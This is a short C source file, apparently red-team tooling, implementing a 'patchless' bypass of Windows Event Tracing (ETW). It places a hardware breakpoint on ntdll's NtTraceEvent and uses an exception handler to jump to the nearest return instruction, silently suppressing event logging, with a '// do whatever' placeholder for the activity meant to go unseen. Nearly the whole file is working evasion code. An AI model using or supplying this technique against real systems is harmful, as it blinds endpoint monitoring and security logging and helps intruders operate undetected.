// Patchless ETW bypass by Mr.Un1k0d3r (be careful patching NtTraceEvent though...) 
// Utilizing https://github.com/rad9800/hwbp4mw/blob/main/HWBP.c
// Idea from https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c

uintptr_t
find_gadget(
    const uintptr_t function,
    const BYTE* stub,
    const UINT size,
    const size_t dist 
)
{
    for (size_t i = 0; i < dist; i++)
    {
        if (memcmp((LPVOID)(function + i), stub, size) == 0) {
            return (function + i);
        }
    }
    return 0ull;
}

void trace_event_patch(
    const PEXCEPTION_POINTERS ExceptionInfo
)
{
    ExceptionInfo->ContextRecord->Rip = find_gadget(
        ExceptionInfo->ContextRecord->Rip,
        "\xc3", 1, 100);
    ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Set Resume Flag
}

int main()
{
    const PVOID handler = hardware_engine_init();

    FARPROC ptrNtTraceEvent = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtTraceEvent");

    insert_descriptor_entry(ptrNtTraceEvent, 0, trace_event_patch, GetCurrentThreadId());

    //
    // do whatever
    //

  
    delete_descriptor_entry(&ptrNtTraceEvent, 0);

    hardware_engine_stop(handler);
}
